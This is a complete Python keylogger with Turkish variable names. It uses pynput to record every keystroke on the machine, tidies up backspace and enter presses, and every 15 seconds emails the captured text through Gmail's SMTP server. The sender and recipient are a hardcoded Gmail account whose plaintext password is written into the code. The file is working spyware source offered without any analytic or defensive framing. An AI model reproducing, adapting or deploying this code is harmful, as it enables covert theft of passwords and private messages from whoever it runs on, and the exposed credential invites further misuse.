import pynput.keyboard
import  smtplib
import threading

toplama = "Keylogger Baslatiliyor..."
toplama = ""

def emir(harfler):
    global toplama
    print("==========================")
    try:
        toplama += harfler.char
    except AttributeError:
        if harfler == pynput.keyboard.Key.space:
            toplama += " "
        elif harfler== pynput.keyboard.Key.backspace:
            sayi = len(toplama)
            sayi -= 1
            deger = 0
            sonuc = ""
            while sayi>deger:
                sonuc += toplama[deger]
                deger += 1
            toplama = sonuc
        elif harfler== pynput.keyboard.Key.enter:
            toplama += "\n"
        else:
            toplama += str(harfler)
    print(toplama)

def mail_gonder(mesaj):
    global toplama
    server = smtplib.SMTP("smtp.gmail.com:587")
    server.starttls()
    server.login("cumit4976@gmail.com","362559Qq")
    server.sendmail("cumit4976@gmail.com","cumit4976@gmail.com",mesaj)
    server.quit()

def dallanma():
    global toplama
    if toplama:
        mail_gonder(toplama)
        toplama =""
    timer = threading.Timer(15,dallanma)
    timer.start()

dinleme = pynput.keyboard.Listener(on_press=emir)

with dinleme:
    dallanma()
    dinleme.join()
